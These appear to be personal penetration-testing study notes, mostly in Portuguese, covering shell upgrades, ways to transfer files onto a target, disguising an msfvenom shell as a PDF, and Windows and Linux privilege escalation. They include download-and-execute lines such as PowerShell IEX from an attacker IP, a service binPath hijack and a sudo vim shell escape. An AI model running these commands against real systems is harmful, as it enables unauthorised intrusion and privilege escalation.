
## Shell Interativa x Shell Não interativa
A shell interativa ela responde aos comandos como uma conexão FTP, uma tentativa de mudar a senha de usuário, enquanto a shell não interativa, apenas serve para comandos sem interação do sistema, como ls -la, id, etc. Porém, caso o servidor possua python, é possível transformar uma shell não interativa em uma shell interativa através do comando: 

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Formas de baixar arquivos no servidor

As formas se baseiam em você subir um servidor com algum protocolo para fazer a transferência de arquivos, e na shell do servidor, utilizar para baixar o arquivo

### HTTP

- Apache: service apache2 start (/var/www/html/file.exe)

- Python: python -m SimpleHTTPServer 80

- Python3: python3 -m http.server 80

#### Windows

- certutil.exe -urlcache -f http://172.20.1.6/file.exe file.exe

- powershell.exe wget http://172.20.1.6/fileexe -OutFile file.exe

- powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://172.20.1.6/file.exe','file.exe')

- powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.1.6/poc.txt')

#### Linux

 - wget http://172.16.1.6/file.exe -O /tmp/file.exe

- curl http://172.20.1.6/file.exe -o file.exe

### FTP

- pip install pyftpdlib

- python -m pyftpdlib -p 21 --write

#### Windows

- echo open 192.168.0.16 > ftp.txt
- echo USER anonymous >> ftp.txt
- echo PASS anonymous >> ftp.txt
- echo bin >> ftp.txt
- echo GET file.exe >> ftp.txt
- echo QUIT >> ftp.txt
- ftp -v -n -s:ftp.txt

## EXE2HEX

Dessa forma, você comprime o arquivo executável para um arquivo de texto, e reconstrói na própria shell do servidor alvo

upx -9 file.exe → para comprimir o arquivo

exe2hex -x file.exe -p (powershell) or -b (batch) file.txt → para criar o arquivo em txt

Depois você copia todo o arquivo de texto e cola na shell do servidor alvo

## Transferência de arquivo

Você cria uma shell através do msfvenom, transforma a shell no formato da aplicação (por exemplo, colocando o header do PDF e a extensão .pdf no arquivo), envia para a aplicação. Após isso você da um tail +number > newfile para transformar o arquivo em executável dentro da aplicação e executa esse arquivo

### Tunelamento Linux

### SOCAT


### Tunelamento Windows

### PLINK

plink.exe --sh -l name -pw root -R pentester ip:port:target ip:port pentester ip

## Windows Privilege Escalation

### Manual

whoami → mostra o usuário que somos

whoami /groups → mostra os grupos que o usuário faz parte

net user username → mostra informações do usuário

net user → mostra informação de todos os usuários

hostname → mostra o nome do host

systeminfo → mostra informações do sistema

tasklist → mostra os processos em execução no sistema

tasklist /SVC → mostra o serviço associado aos processos

ipconfig /all → mostra todas as informações dos adaptadores de rede

arp -a → mostra a tabela ARP com que hosts esse host se comunica na rede interna

route print → mostra informações sobre a tabela de roteamento

netstat -ano → mostra informações sobre as portas abertas no sistema

sc query servicename → mostra informações sobre o serviço (windefend é o antivirus do windows)

netsh advfirewall show currentprofile → mostra informações do firewall

where /R directory file → busca um arquivo no sistema

findsrt /s “string” * → busca por uma string no sistema

### Automatico

para ver informações do sistema

[https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

para ver possiveis vulnerabilidades conforme o sistema operacional

[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

python [wes.py](http://wes.py) --update → para atualizar

systeminfo > systeminfo.txt → precisa no alvo

python [wes.py](http://wes.py) systeminfo file

## Bypass UAC



### SysinternalsSuite

Procmon → Monitora processos

Sigcheck → Ver informações do manifest

sigcheck -a -m directory/file.xe

asInvoker → mesmo nível de permissão que o usuário

highestAvailable → tenta trazer o nível mais alto que conseguir

requireAdministrator → precisa estar em administrator para executar

### WMIC

wmic service → mostra todos os serviços

wmic service get Name, State, PathName | findstr “Running” → mostra os serviços rodando

icacls “service directory” → mostra as permissões do serviço

SysinternalsSuite → accesschk.exe -wvcu “Users” * → mostra todos os serviços com permissão de escrita

sc qc service name → informações de configuração

sc query service name → informações do serviço

sc stop service name → para o serviço

sc start service name → inicia o serviço

sc config service name binPath=”command” → muda o caminho binário para um comando

## Linux Privilege Escalation

### Manual

uname -a → ve informações do sistema operacional

cat /etc/issue → ve o sistema operacional

cat /etc/*-release → ve informações completas do sistema operacional

dpkg -l → lista os programas instalados

ifconfig -a → mostra informações de rede

netstat -nlpt → mostra portas abertas

ps aux → mostra os processos em execução

### Automatico

para ver informações do sistema

[https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

[https://linpeas.sh/](https://linpeas.sh/)

para ver possiveis vulnerabilidades

[https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

#### Sudo

através de programas que rodam como sudo, da para escalar os privilégios

sudo -l → mostra programas que rodam como sudo

vim example: sudo vim -c ‘!bash’

#### Cron

cat /etc/crontab → mostra os crons

find / -type f - perm 777 2>/dev/null → encontra arquivos com permissões máximas

## Vertical Escalation x Horizontal Escalation

## Sudo Rights
### What is sudo?
Utilitário Unix like que permite a elevação de privilégios (means Super User do), you can use `sudo -l` to see which commands your user have permission with sudo
### Where is configurated?
In /etc/sudoers
### How the file works?
User Host=(User or group) Command

## Suid Bit Misconfiguration
### What is SUID?
Special permission that possibilities user executes a file with the owner privileges, if the binary have SUID (Set User ID)

### How identify the binaries with SUID?
find / -perm -u=s 2>/dev/null
find / -perm -4000 2>/dev/null

### How to validate a binary?
https://gtfobins.github.io

## Path Bad Configuration
### What is a variable?
Memory address that can store data

### $PATH
At linux, $PATH it's a environment variable that informs SO where 

### How validate $PATH?
echo $PATH

## Kernel Exploits
### What is the kernel?
Kernel is the responsable to intermediate between hardware and software, doing the low level tasks,

### How to abuse?
Buffer Overflow, vulnerable libraries, UID changes in public exploits. To validate the kernel informations you can use `uname -a`, but remember, kernel exploit should be the last option to use when escalation the privilege


- Weak/reused/plaintext passwords

`find / -name '*.db' -o name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null`